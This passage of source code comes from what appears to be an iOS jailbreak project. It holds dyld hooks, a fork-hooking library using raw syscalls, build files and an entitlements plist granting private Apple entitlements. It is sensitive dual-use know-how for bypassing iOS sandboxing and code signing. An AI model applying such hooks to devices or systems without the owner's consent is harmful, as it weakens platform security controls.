		consume_tokenized_sandbox_extensions(sandboxExtensionsPtr);
		jbInfo->jbRootPath = jbRootPathPtr;
		jbInfo->bootUUID = bootUUIDPtr;
		jbInfo->sandboxExtensions = sandboxExtensionsPtr;
		jbInfo->state = DYLD_STATE_CHECKED_IN;
	}
}

void dyldhook_init(uintptr_t kernelParams)
{
	// If we are in launchd, bail out
	if (getpid() == 1) {
		return;
	}

	// Walk kernelParams to get envp
	uintptr_t argc = *(uintptr_t *)(kernelParams + sizeof(void *));
	char **envp = (char **)(kernelParams + sizeof(void *) + sizeof(argc) + (sizeof(const char *) * argc) + sizeof(void *));

	// If DYLD_INSERT_LIBRARIES is not set or does not contain systemhook, bail out
	const char *insertLibrariesVar = _simple_getenv(envp, "DYLD_INSERT_LIBRARIES");
	if (!insertLibrariesVar) return;
	if (!strstr(insertLibrariesVar, "/systemhook.dylib")) return;

	// If all is well, do check-in right here before dyld_start!
	dyldhook_perform_checkin();
}
```

`BaseBin/dyldhook/src/reimpl.c`:

```c
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <sandbox.h>
#include <limits.h>
#include <mach/mach.h>

#include "dyld.h"

__attribute__((naked)) uint64_t msyscall_errno(uint64_t syscall, ...)
{
    asm(
        "mov x16, x0\n"
        "ldp x0, x1, [sp]\n"
        "ldp x2, x3, [sp, 0x10]\n"
        "ldp x4, x5, [sp, 0x20]\n"
        "ldp x6, x7, [sp, 0x30]\n"
        "svc 0x80\n"
        "b.cs 20f\n"
        "ret\n"
        "20:\n"
        "b _cerror\n"
        );
}

int64_t sandbox_extension_consume(const char *extension_token)
{
	int64_t r = 0xAAAAAAAAAAAAAAAA;
	if (!strcmp(extension_token, "invalid")) return 0;

	struct sandbox_policy_layout data = {
		.profile = (void *)extension_token,
		.len = strlen(extension_token) + 1,
		.container = &r,
	};

	if (__sandbox_ms("Sandbox", 6, &data) != 0) {
		return -1;
	}
	else {
		return r;
	}
}

// mig_get_reply_port has to be reimplemented because the implementation inside dyld accesses TPIDRRO_EL0 (which is NULL when the dyldhook code runs)
// We make the reimplementation store it in a global instead, which is enough since we will only be calling it from one thread anyways
// gMigReplyPort will be invalid after the process forks, so we need to make sure to only use that during the process initialization
// That's why after TPIDRRO_EL0 has been initialized, we will simply use dyld's mig_get_reply_port again, since TPIDRRO_EL0 should be initialized the next time it's called

uint64_t __attribute((noinline, naked)) get_tpidrro_el0(void)
{
	__asm("mrs x0, TPIDRRO_EL0");
	__asm("ret");
}

mach_port_t gMigReplyPort = 0;
mach_port_t dyld_mig_get_reply_port(void);

#if IOS == 15
extern mach_port_t mach_reply_port(void);

mach_port_t mig_get_reply_port(void) {
	if (get_tpidrro_el0() == 0) {
		if (!gMigReplyPort) {
			gMigReplyPort = mach_reply_port();
		}
		return gMigReplyPort;
	}

	return dyld_mig_get_reply_port();
}
#else // iOS 16+

struct mach_port_options gMigOptions = {
	.flags = 0x1000,
};

mach_port_t mig_get_reply_port(void) {
	if (get_tpidrro_el0() == 0) {
		if (!gMigReplyPort) {
			struct mach_port_options options = gMigOptions;
			mach_port_construct(task_self_trap(), &options, 0, &gMigReplyPort);
		}
		return gMigReplyPort;
	}

	return dyld_mig_get_reply_port();
}

// iOS 16+ dyld's do no longer have mach_msg, reimplement it
// We also need to reimplement mach_msg2, since task.c needs it

__options_decl(mach_msg_option64_t, uint64_t, {
	MACH64_MSG_OPTION_NONE                 = 0x0ull,
	/* share lower 32 bits with mach_msg_option_t */
	MACH64_SEND_MSG                        = MACH_SEND_MSG,
	MACH64_RCV_MSG                         = MACH_RCV_MSG,

	MACH64_RCV_LARGE                       = MACH_RCV_LARGE,
	MACH64_RCV_LARGE_IDENTITY              = MACH_RCV_LARGE_IDENTITY,

	MACH64_SEND_TIMEOUT                    = MACH_SEND_TIMEOUT,
	MACH64_SEND_OVERRIDE                   = MACH_SEND_OVERRIDE,
	MACH64_SEND_INTERRUPT                  = MACH_SEND_INTERRUPT,
	MACH64_SEND_NOTIFY                     = MACH_SEND_NOTIFY,
#if KERNEL
	MACH64_SEND_ALWAYS                     = MACH_SEND_ALWAYS,
	MACH64_SEND_IMPORTANCE                 = MACH_SEND_IMPORTANCE,
	MACH64_SEND_KERNEL                     = MACH_SEND_KERNEL,
#endif
	MACH64_SEND_FILTER_NONFATAL            = MACH_SEND_FILTER_NONFATAL,
	MACH64_SEND_TRAILER                    = MACH_SEND_TRAILER,
	MACH64_SEND_NOIMPORTANCE               = MACH_SEND_NOIMPORTANCE,
	MACH64_SEND_NODENAP                    = MACH_SEND_NODENAP,
	MACH64_SEND_SYNC_OVERRIDE              = MACH_SEND_SYNC_OVERRIDE,
	MACH64_SEND_PROPAGATE_QOS              = MACH_SEND_PROPAGATE_QOS,

	MACH64_SEND_SYNC_BOOTSTRAP_CHECKIN     = MACH_SEND_SYNC_BOOTSTRAP_CHECKIN,

	MACH64_RCV_TIMEOUT                     = MACH_RCV_TIMEOUT,

	MACH64_RCV_INTERRUPT                   = MACH_RCV_INTERRUPT,
	MACH64_RCV_VOUCHER                     = MACH_RCV_VOUCHER,

	MACH64_RCV_GUARDED_DESC                = MACH_RCV_GUARDED_DESC,
	MACH64_RCV_SYNC_WAIT                   = MACH_RCV_SYNC_WAIT,
	MACH64_RCV_SYNC_PEEK                   = MACH_RCV_SYNC_PEEK,

	MACH64_MSG_STRICT_REPLY                = MACH_MSG_STRICT_REPLY,
	/* following options are 64 only */

	/* Send and receive message as vectors */
	MACH64_MSG_VECTOR                      = 0x0000000100000000ull,
	/* The message is a kobject call */
	MACH64_SEND_KOBJECT_CALL               = 0x0000000200000000ull,
	/* The message is sent to a message queue */
	MACH64_SEND_MQ_CALL                    = 0x0000000400000000ull,
	/* This message destination is unknown. Used by old simulators only. */
	MACH64_SEND_ANY                        = 0x0000000800000000ull,

#ifdef XNU_KERNEL_PRIVATE
	/*
	 * If kmsg has auxiliary data, append it immediate after the message
	 * and trailer.
	 *
	 * Must be used in conjunction with MACH64_MSG_VECTOR
	 */
	MACH64_RCV_LINEAR_VECTOR               = 0x1000000000000000ull,
	/* Receive into highest addr of buffer */
	MACH64_RCV_STACK                       = 0x2000000000000000ull,
	/*
	 * This internal-only flag is intended for use by a single thread per-port/set!
	 * If more than one thread attempts to MACH64_PEEK_MSG on a port or set, one of
	 * the threads may miss messages (in fact, it may never wake up).
	 */
	MACH64_PEEK_MSG                        = 0x4000000000000000ull,
	/*
	 * This is a mach_msg2() send/receive operation.
	 */
	MACH64_MACH_MSG2                       = 0x8000000000000000ull
#endif
});

mach_msg_return_t
mach_msg2_internal(
	void *data,
	mach_msg_option64_t option64,
	uint64_t msgh_bits_and_send_size,
	uint64_t msgh_remote_and_local_port,
	uint64_t msgh_voucher_and_id,
	uint64_t desc_count_and_rcv_name,
	uint64_t rcv_size_and_priority,
	uint64_t timeout);

typedef struct {
	/* a mach_msg_header_t* or mach_msg_aux_header_t* */
	mach_vm_address_t               msgv_data;
	/* if msgv_rcv_addr is non-zero, use it as rcv address instead */
	mach_vm_address_t               msgv_rcv_addr;
	mach_msg_size_t                 msgv_send_size;
	mach_msg_size_t                 msgv_rcv_size;
} mach_msg_vector_t;

mach_msg_return_t mach_msg2(
	void *data,
	mach_msg_option64_t option64,
	mach_msg_header_t header,
	mach_msg_size_t send_size,
	mach_msg_size_t rcv_size,
	mach_port_t rcv_name,
	uint64_t timeout,
	uint32_t priority)
{
	mach_msg_base_t *base;
	mach_msg_size_t descriptors;

	if (option64 & MACH64_MSG_VECTOR) {
		base = (mach_msg_base_t *)((mach_msg_vector_t *)data)->msgv_data;
	} else {
		base = (mach_msg_base_t *)data;
	}

	if ((option64 & MACH64_SEND_MSG) &&
	    (base->header.msgh_bits & MACH_MSGH_BITS_COMPLEX)) {
		descriptors = base->body.msgh_descriptor_count;
	} else {
		descriptors = 0;
	}

#define MACH_MSG2_SHIFT_ARGS(lo, hi) ((uint64_t)hi << 32 | (uint32_t)lo)
	return mach_msg2_internal(data, option64,
	           MACH_MSG2_SHIFT_ARGS(header.msgh_bits, send_size),
	           MACH_MSG2_SHIFT_ARGS(header.msgh_remote_port, header.msgh_local_port),
	           MACH_MSG2_SHIFT_ARGS(header.msgh_voucher_port, header.msgh_id),
	           MACH_MSG2_SHIFT_ARGS(descriptors, rcv_name),
	           MACH_MSG2_SHIFT_ARGS(rcv_size, priority), timeout);
#undef MACH_MSG2_SHIFT_ARGS
}

kern_return_t mach_msg(mach_msg_header_t *msg, mach_msg_option_t option, mach_msg_size_t send_size, mach_msg_size_t rcv_size, mach_port_name_t rcv_name, mach_msg_timeout_t timeout, mach_port_name_t notify)
{
	return mach_msg_overwrite(msg, option, send_size, rcv_size, rcv_name, timeout, notify, NULL, 0);
}

#endif
```

`BaseBin/dyldhook/src/spinlock_fix.c`:

```c
#if IOS==15 && __arm64e__

#include <stdint.h>
#include <stdbool.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sandbox.h>
#include <fcntl.h>
#include <limits.h>
#include <stdio.h>
#include <sys/mman.h>
#define TARGET_OS_SIMULATOR 0
#include <dyld_cache_format.h>

#include "machomerger_hook.h"

char *__locate_dsc(void)
{
	// We make two assumptions here
	// 1. This code is only called on iOS 15 arm64e (since the spinlock panic doesn't affect anything else)
	// 2. This code is only called if the shared cache has been mapped in via a shared region
	// For these reasons, we can just hardcode the path
	return "/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64e";
}

void __dsc_file_enumerate_mappings(int fd, struct dyld_cache_header *header, uintptr_t slide, bool (*enumeratorFunc)(int fd, struct dyld_cache_header *header, uintptr_t slide, struct dyld_cache_mapping_info *mapping))
{
	struct dyld_cache_mapping_info mappingInfos[header->mappingCount];
	lseek(fd, header->mappingOffset, SEEK_SET);
	if (read(fd, mappingInfos, sizeof(struct dyld_cache_mapping_info) * header->mappingCount) != sizeof(struct dyld_cache_mapping_info) * header->mappingCount) return;

	for (uint32_t i = 0; i < header->mappingCount; i++) {
		struct dyld_cache_mapping_info *mapping = &mappingInfos[i];
		enumeratorFunc(fd, header, slide, mapping);
	}
}

void __dsc_enumerate_mappings(uintptr_t slide, bool (*enumeratorFunc)(int fd, struct dyld_cache_header *header, uintptr_t slide, struct dyld_cache_mapping_info *mapping))
{
	char *dscPath = __locate_dsc();

	int dscFd = open(dscPath, O_RDONLY);
	if (dscFd < 0) return;

	struct dyld_cache_header header;
	if (read(dscFd, &header, sizeof(header)) != sizeof(header)) { close(dscFd); return; }

	__dsc_file_enumerate_mappings(dscFd, &header, slide, enumeratorFunc);

	struct dyld_subcache_entry_v1 subcacheEntries[header.subCacheArrayCount];
	lseek(dscFd, header.subCacheArrayOffset, SEEK_SET);
	if (read(dscFd, subcacheEntries, sizeof(struct dyld_subcache_entry_v1) * header.subCacheArrayCount) != sizeof(struct dyld_subcache_entry_v1) * header.subCacheArrayCount) { close(dscFd); return; };

	for (uint32_t i = 0; i < header.subCacheArrayCount; i++) {
		char subcachePath[PATH_MAX];
		strcpy(subcachePath, dscPath);

		// Only supports 1-9
		// Since iOS 15 usually only has one subcache, this shall be fine
		char suffix[3];
		suffix[0] = '.';
		suffix[1] = '1' + i;
		suffix[2] = '\0';
		strcat(subcachePath, suffix);

		int subcacheFd = open(subcachePath, O_RDONLY);
		if (subcacheFd >= 0) {
			struct dyld_cache_header subcacheHeader;
			if (read(subcacheFd, &subcacheHeader, sizeof(subcacheHeader)) != sizeof(subcacheHeader)) continue;
			__dsc_file_enumerate_mappings(subcacheFd, &subcacheHeader, slide, enumeratorFunc);
			close(subcacheFd);
		}
	}

	close(dscFd);
}

int __dsc_attach_signature(int fd, struct dyld_cache_header *header)
{
	fsignatures_t siginfo;
    siginfo.fs_file_start = 0;
    siginfo.fs_blob_start = (void*)header->codeSignatureOffset;
    siginfo.fs_blob_size  = (size_t)(header->codeSignatureSize);
    return fcntl(fd, F_ADDFILESIGS_RETURN, &siginfo);
}

bool __dsc_mapping_make_private(int fd, struct dyld_cache_header *header, uintptr_t slide, struct dyld_cache_mapping_info *mapping)
{
	if (mapping->initProt & PROT_EXEC) {
		int r = __dsc_attach_signature(fd, header);
		if (r == 0) {
			void *r = mmap((void *)(mapping->address + slide), mapping->size, PROT_READ | PROT_EXEC, MAP_FIXED | MAP_PRIVATE, fd, mapping->fileOffset);
		}
	}
	return true;
}

void dyld_make_dsc_text_private(uintptr_t slide)
{
	__dsc_enumerate_mappings(slide, __dsc_mapping_make_private);
}

extern bool ORIG(_ZN5dyld313loadDyldCacheERKNS_18SharedCacheOptionsEPNS_19SharedCacheLoadInfoE)(uintptr_t options, uintptr_t results);
bool HOOK(_ZN5dyld313loadDyldCacheERKNS_18SharedCacheOptionsEPNS_19SharedCacheLoadInfoE)(uintptr_t options, uintptr_t results)
{
	bool r = ORIG(_ZN5dyld313loadDyldCacheERKNS_18SharedCacheOptionsEPNS_19SharedCacheLoadInfoE)(options, results);

	bool forcePrivate = *(bool *)(options + 8);
	if (!forcePrivate) {
		long slide = *(long *)(results + 8);
		dyld_make_dsc_text_private(slide);
	}

	return r;
}

#endif
```

`BaseBin/forkfix/Makefile`:

```
TARGET = forkfix.dylib
CC = clang

CFLAGS = -I../.include -I./src -I../_external/modules/litehook/src -isysroot $(shell xcrun --sdk iphoneos --show-sdk-path) -arch arm64e -Wno-deprecated-declarations -miphoneos-version-min=15.0 -O2
LDFLAGS = ../systemhook/systemhook.dylib -dynamiclib

sign: $(TARGET)
	@ldid -S $^

$(TARGET): $(wildcard src/*.c src/*.S ../libjailbreak/src/jbclient_*.c)
	$(CC) $(CFLAGS) $(LDFLAGS) -o $@ $^

clean:
	@rm -f $(TARGET)

```

`BaseBin/forkfix/src/main.c`:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <signal.h>
#include <dlfcn.h>
#include <os/log.h>
#include <util.h>
#include "syscall.h"
#include "litehook.h"
#include <libjailbreak/jbclient_mach.h>

extern void __fork(void);

int childToParentPipe[2];
int parentToChildPipe[2];
static void open_pipes(void)
{
	if (pipe(parentToChildPipe) < 0 || pipe(childToParentPipe) < 0) {
		abort();
	}
}
static void close_pipes(void)
{
	if (ffsys_close(parentToChildPipe[0]) != 0 || ffsys_close(parentToChildPipe[1]) != 0 || ffsys_close(childToParentPipe[0]) != 0 || ffsys_close(childToParentPipe[1]) != 0) {
		abort();
	}
}

void child_fixup(void)
{
	// Tell parent we are waiting for fixup now
	char msg = ' ';
	ffsys_write(childToParentPipe[1], &msg, sizeof(msg));

	// Wait until parent completes fixup
	ffsys_read(parentToChildPipe[0], &msg, sizeof(msg));
}

void parent_fixup(pid_t childPid)
{
	// Wait until the child is ready and waiting
	char msg = ' ';
	read(childToParentPipe[0], &msg, sizeof(msg));

	// Child is waiting for wx_allowed + permission fixups now
	// Apply fixup
	int64_t fix_ret = jbclient_mach_fork_fix(childPid);
	if (fix_ret != 0) {
		kill(childPid, SIGKILL);
		abort();
	}

	// Tell child we are done, this will make it resume
	write(parentToChildPipe[1], &msg, sizeof(msg));
}

__attribute__((visibility ("default"))) pid_t forkfix___fork(void)
{
	open_pipes();

	pid_t pid = ffsys_fork();
	if (pid < 0) {
		close_pipes();
		return pid;
	}

	if (pid == 0) {
		child_fixup();
	}
	else {
		parent_fixup(pid);
	}

	close_pipes();
	return pid;
}

void apply_fork_hook(void)
{
	static dispatch_once_t onceToken;
	dispatch_once (&onceToken, ^{
		litehook_hook_function((void *)__fork, (void *)forkfix___fork);
	});
}

__attribute__((constructor)) static void initializer(void)
{
	apply_fork_hook();
}

```

`BaseBin/forkfix/src/reimpl.c.disabled`:

```disabled
// This file contains reimplementations for everything that calls fork
// This would be neccessary if we want to use DYLD_INTERPOSE instead of hooking __fork directly
// It is no longer used for the following reasons:
// - Spinlock panics are fixed, so there is no disadvantage of hooking __fork directly
// - There are weird issues happening when interposing fork (Some CLI scripts start failing in weird ways)

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/wait.h>
#include <signal.h>
#include <dlfcn.h>
#include <os/log.h>
#include <util.h>
#include <errno.h>
#include <syslog.h>
#include <mach-o/dyld.h>
#include "../_external/modules/litehook/src/litehook.h"

kern_return_t bootstrap_parent(mach_port_t bp, mach_port_t *parent_port);
void __fork(void);

// There are two functions with direct branches to __fork: fork and vfork
// We want to rebind these to reimplementations that work the same, but call our __forkfix_fork instead

// Additionally, there are also two functions with direct branches to fork: daemon and forkpty
// For these, we want to rebind them to reimplementations that work the same, but call our fork_reimpl instead

// Unfortunately, there is no other option here than to reimplement the functions, since the point is to do no instruction replacements

static int (*__fork_ptr)(void) = NULL;

void (**_libSystem_atfork_prepare)(uint64_t v2Arg) = NULL;
void (**_libSystem_atfork_parent) (uint64_t v2Arg) = NULL;
void (**_libSystem_atfork_child)  (uint64_t v2Arg) = NULL;

int fork_reimpl(void)
{
	(*_libSystem_atfork_prepare)(0);
	int pid = __fork_ptr();
	if (pid != 0) {
		(*_libSystem_atfork_parent)(0);
	}
	else {
		(*_libSystem_atfork_child)(0);
	}
	return pid;
}

int vfork_reimpl(void)
{
	(*_libSystem_atfork_prepare)(1);
	int pid = __fork_ptr();
	if (pid != 0) {
		(*_libSystem_atfork_parent)(1);
	}
	else {
		(*_libSystem_atfork_child)(1);
	}
	return pid;
}

static void move_to_root_bootstrap(void)
{
	mach_port_t parent_port = 0;
	mach_port_t previous_port = 0;

	do {
		if (previous_port) {
			mach_port_deallocate(mach_task_self(), previous_port);
			previous_port = parent_port;
		} else {
			previous_port = bootstrap_port;
		}

		if (bootstrap_parent(previous_port, &parent_port) != 0) {
			return;
		}
	} while (parent_port != previous_port);

	task_set_bootstrap_port(mach_task_self(), parent_port);
	bootstrap_port = parent_port;
}

int daemon_reimpl(int nochdir, int noclose)
{
	struct sigaction osa, sa;
	int fd;
	pid_t newgrp;
	int oerrno;
	int osa_ok;

	/* A SIGHUP may be thrown when the parent exits below. */
	sigemptyset(&sa.sa_mask);
	sa.sa_handler = SIG_IGN;
	sa.sa_flags = 0;
	osa_ok = sigaction(SIGHUP, &sa, &osa);
	move_to_root_bootstrap();
	switch (fork_reimpl()) {
	case -1:
		return (-1);
	case 0:
		break;
	default:
		_exit(0);
	}

	newgrp = setsid();
	oerrno = errno;
	if (osa_ok != -1)
		sigaction(SIGHUP, &osa, NULL);

	if (newgrp == -1) {
		errno = oerrno;
		return (-1);
	}

	if (!nochdir)
		(void)chdir("/");

	if (!noclose && (fd = open("/dev/null", O_RDWR, 0)) != -1) {
		(void)dup2(fd, STDIN_FILENO);
		(void)dup2(fd, STDOUT_FILENO);
		(void)dup2(fd, STDERR_FILENO);
		if (fd > 2)
			(void)close(fd);
	}
	return (0);
}

int forkpty_reimpl(int *aprimary, char *name, struct termios *termp, struct winsize *winp)
{
	int primary, replica, pid;

	if (openpty(&primary, &replica, name, termp, winp) == -1)
		return (-1);
	switch (pid = fork_reimpl()) {
	case -1:
		(void) close(primary);
		(void) close(replica);
		return (-1);
	case 0:
		/* 
		 * child
		 */
		(void) close(primary);
		/*
		 * 4300297: login_tty() may fail to set the controlling tty.
		 * Since we have already forked, the best we can do is to 
		 * dup the replica as if login_tty() succeeded.
		 */
		if (login_tty(replica) < 0) {
			syslog(LOG_ERR, "forkpty: login_tty could't make controlling tty");
			(void) dup2(replica, 0);
			(void) dup2(replica, 1);
			(void) dup2(replica, 2);
			if (replica > 2)
				(void) close(replica);
		}
		return (0);
	}
	/*
	 * parent
	 */
	*aprimary = primary;
	(void) close(replica);
	return (pid);
}

bool fork_rebind_filter(const mach_header *header)
{
	Dl_info info;
	dladdr(header, &info);

	const char *path = info.dli_fname;
	if (_dyld_shared_cache_contains_path(path)) {
		// Ignore all dsc images that don't have fork or __fork pointers in their GOTs
		// Just reading a GOT faults it in, which increases the resident memory
		// By skipping these we save a fuck ton of memory and avoid issues with jetsam
		// Unfortunately this is hardcoded since you cannot know them without reading their GOTs
		// Since this code is only used on iOS 15, it should be fine
		if (!strcmp(path, "/usr/lib/system/libsystem_c.dylib") || 
			!strcmp(path, "/System/Library/Frameworks/SystemConfiguration.framework/SystemConfiguration") ||
			!strcmp(path, "/System/Library/Frameworks/FileProvider.framework/FileProvider") || 
			!strcmp(path, "/System/Library/PrivateFrameworks/UIKitCore.framework/UIKitCore") ||
			!strcmp(path, "/System/Library/PrivateFrameworks/LoggingSupport.framework/LoggingSupport")) {
			return true;
		}
		return false;
	}

	return true;
}

bool fork_reimpl_init(void *fork_ptr)
{
	if (!fork_ptr) return false;

	__fork_ptr = fork_ptr;

	// The v2 functions take one argument, but we can still store them in the same pointer since the argument will just be discarded if the non v2 implementation is used
	// In practice, the v2 implementation should always exist, since we're not dealing with super old versions, so all of this doesn't matter too much
	const char *libcpath = "/usr/lib/system/libsystem_c.dylib";
	_libSystem_atfork_prepare = litehook_find_dsc_symbol(libcpath, "__libSystem_atfork_prepare_v2") ?: litehook_find_dsc_symbol(libcpath, "__libSystem_atfork_prepare");
	_libSystem_atfork_parent  = litehook_find_dsc_symbol(libcpath, "__libSystem_atfork_parent_v2")  ?: litehook_find_dsc_symbol(libcpath, "__libSystem_atfork_parent");
	_libSystem_atfork_child   = litehook_find_dsc_symbol(libcpath, "__libSystem_atfork_child_v2")   ?: litehook_find_dsc_symbol(libcpath, "__libSystem_atfork_child");

	litehook_rebind_symbol(LITEHOOK_REBIND_GLOBAL, (void *)__fork,  (void *)__fork_ptr,     fork_rebind_filter);
	litehook_rebind_symbol(LITEHOOK_REBIND_GLOBAL, (void *)fork,    (void *)fork_reimpl,    fork_rebind_filter);
	litehook_rebind_symbol(LITEHOOK_REBIND_GLOBAL, (void *)vfork,   (void *)vfork_reimpl,   fork_rebind_filter);
	litehook_rebind_symbol(LITEHOOK_REBIND_GLOBAL, (void *)daemon,  (void *)daemon_reimpl , fork_rebind_filter);
	litehook_rebind_symbol(LITEHOOK_REBIND_GLOBAL, (void *)forkpty, (void *)forkpty_reimpl, fork_rebind_filter);

	return true;
}
```

`BaseBin/forkfix/src/reimpl.h.disabled`:

```disabled
int fork_reimpl(void);
int vfork_reimpl(void);
int daemon_reimpl(int nochdir, int noclose);
int forkpty_reimpl(int *aprimary, char *name, struct termios *termp, struct winsize *winp);

bool fork_reimpl_init(void *fork_ptr);
```

`BaseBin/forkfix/src/syscall.S`:

```S
.text

.align 4

.global _ffsys_fork
_ffsys_fork:
#ifdef __arm64e__
	pacibsp
#endif
	stp x29, x30, [SP, #-0x10]!
	mov x29, sp
	mov x16, #2
	svc 0x80
	b.cs _ffsys_fork_err
	cbz x1, _ffsys_fork_end
	mov w0, #0
	adrp x9, __current_pid@GOTPAGE
	ldr x9, [x9, __current_pid@GOTPAGEOFF]
	str w0, [x9]
	b _ffsys_fork_end

_ffsys_fork_err:
	bl _cerror
	mov w0, #-1

_ffsys_fork_end:
	mov sp, x29
	ldp x29, x30, [SP],#0x10
#ifdef __arm64e__
	retab
#else
    ret
#endif

.global _ffsys_vm_protect
_ffsys_vm_protect:
	mov x16, #-14
	svc 0x80
	ret

.global _ffsys_getpid
_ffsys_getpid:
	mov x16, #20
	svc 0x80
	ret

.global _ffsys_pid_suspend
_ffsys_pid_suspend:
	mov x16, #433
	svc 0x80
	ret

.global _ffsys_read
_ffsys_read:
	mov x16, #3
	svc 0x80
	ret

.global _ffsys_write
_ffsys_write:
	mov x16, #4
	svc 0x80
	ret

.global _ffsys_close
_ffsys_close:
	mov x16, #6
	svc 0x80
	ret

```

`BaseBin/forkfix/src/syscall.h`:

```h
kern_return_t ffsys_vm_protect(vm_map_t target_task, vm_address_t address, vm_size_t size, boolean_t set_maximum, vm_prot_t new_protection);
pid_t ffsys_fork(void);
pid_t ffsys_getpid(void);
int ffsys_pid_suspend(pid_t pid);

ssize_t ffsys_read(int fildes, void *buf, size_t nbyte);
ssize_t ffsys_write(int fildes, const void *buf, size_t nbyte);
int ffsys_close(int fildes);

```

`BaseBin/idownloadd/Makefile`:

```
XCODE_PROJECT = src/idownloadd.xcodeproj
XCODE_SCHEME = idownloadd
CS_FLAGS = CODE_SIGN_IDENTITY="" CODE_SIGNING_REQUIRED=NO CODE_SIGNING_ALLOWED=NO
CONFIGURATION = Release

OUTPUT_NAME = idownloadd

build:
	xcodebuild -archivePath ./.build -project $(XCODE_PROJECT) -scheme $(XCODE_SCHEME) -configuration $(CONFIGURATION) -destination generic/platform=iOS archive $(CS_FLAGS)
	@cp -f ./.build.xcarchive/Products/usr/local/bin/$(OUTPUT_NAME) .
	@rm -rf ./.build.xcarchive
	@ldid -Sentitlements.plist $(OUTPUT_NAME)

clean:
	xcodebuild -project $(XCODE_PROJECT) -scheme $(XCODE_SCHEME) -configuration $(CONFIGURATION) -destination generic/platform=iOS clean
	@rm -rf $(OUTPUT_NAME)

default: build
```

`BaseBin/idownloadd/entitlements.plist`:

```plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>platform-application</key>
	<true/>
	<key>com.apple.private.security.no-container</key>
	<true/>
	<key>com.apple.private.security.storage.AppBundles</key>
	<true/>
	<key>com.apple.private.security.storage.AppDataContainers</key>
	<true/>
	<key>com.apple.security.exception.iokit-user-client-class</key>
	<array>
		<string>IOSurfaceRootUserClient</string>
	</array>
</dict>
</plist>

```

`BaseBin/idownloadd/src/idownloadd.xcodeproj/project.pbxproj`:

```pbxproj
// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 56;
	objects = {

/* Begin PBXBuildFile section */
		8C69A2262A320BBE007E401C /* main.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8C69A2252A320BBE007E401C /* main.swift */; };
		8C69A22E2A320CCC007E401C /* iDownload in Frameworks */ = {isa = PBXBuildFile; productRef = 8C69A22D2A320CCC007E401C /* iDownload */; };
		8C69A2302A320E71007E401C /* iDownloadKRW.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8C69A22F2A320E71007E401C /* iDownloadKRW.swift */; };
		8C69A23F2A32239B007E401C /* iDownloadCmds.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8C69A23E2A32239B007E401C /* iDownloadCmds.swift */; };
		8CE664652B61DF0200D7895C /* shim.c in Sources */ = {isa = PBXBuildFile; fileRef = 8CE664642B61DF0200D7895C /* shim.c */; };
		8CE664672B61E36200D7895C /* libjailbreak.dylib in Frameworks */ = {isa = PBXBuildFile; fileRef = 8CE664662B61E36200D7895C /* libjailbreak.dylib */; platformFilter = ios; };
/* End PBXBuildFile section */

/* Begin PBXCopyFilesBuildPhase section */
		8C69A2202A320BBE007E401C /* CopyFiles */ = {
			isa = PBXCopyFilesBuildPhase;
			buildActionMask = 2147483647;
			dstPath = /usr/share/man/man1/;
			dstSubfolderSpec = 0;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 1;
		};
/* End PBXCopyFilesBuildPhase section */

/* Begin PBXFileReference section */
		8C69A2222A320BBE007E401C /* idownloadd */ = {isa = PBXFileReference; explicitFileType = "compiled.mach-o.executable"; includeInIndex = 0; path = idownloadd; sourceTree = BUILT_PRODUCTS_DIR; };
		8C69A2252A320BBE007E401C /* main.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = main.swift; sourceTree = "<group>"; };
		8C69A22F2A320E71007E401C /* iDownloadKRW.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = iDownloadKRW.swift; sourceTree = "<group>"; };
		8C69A23D2A321337007E401C /* idownloadd-Bridging-Header.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "idownloadd-Bridging-Header.h"; sourceTree = "<group>"; };
		8C69A23E2A32239B007E401C /* iDownloadCmds.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = iDownloadCmds.swift; sourceTree = "<group>"; };
		8CE664642B61DF0200D7895C /* shim.c */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.c; path = shim.c; sourceTree = "<group>"; };
		8CE664662B61E36200D7895C /* libjailbreak.dylib */ = {isa = PBXFileReference; lastKnownFileType = "compiled.mach-o.dylib"; name = libjailbreak.dylib; path = ../../.build/libjailbreak.dylib; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		8C69A21F2A320BBE007E401C /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				8CE664672B61E36200D7895C /* libjailbreak.dylib in Frameworks */,
				8C69A22E2A320CCC007E401C /* iDownload in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		8C69A2192A320BBE007E401C = {
			isa = PBXGroup;
			children = (
				8C69A2242A320BBE007E401C /* idownloadd */,
				8C69A2232A320BBE007E401C /* Products */,
				8C69A2312A320F8A007E401C /* Frameworks */,
			);
			sourceTree = "<group>";
		};
		8C69A2232A320BBE007E401C /* Products */ = {
			isa = PBXGroup;
			children = (
				8C69A2222A320BBE007E401C /* idownloadd */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		8C69A2242A320BBE007E401C /* idownloadd */ = {
			isa = PBXGroup;
			children = (
				8C69A2252A320BBE007E401C /* main.swift */,
				8C69A22F2A320E71007E401C /* iDownloadKRW.swift */,
				8C69A23E2A32239B007E401C /* iDownloadCmds.swift */,
				8C69A23D2A321337007E401C /* idownloadd-Bridging-Header.h */,
				8CE664642B61DF0200D7895C /* shim.c */,
			);
			path = idownloadd;
			sourceTree = "<group>";
		};
		8C69A2312A320F8A007E401C /* Frameworks */ = {
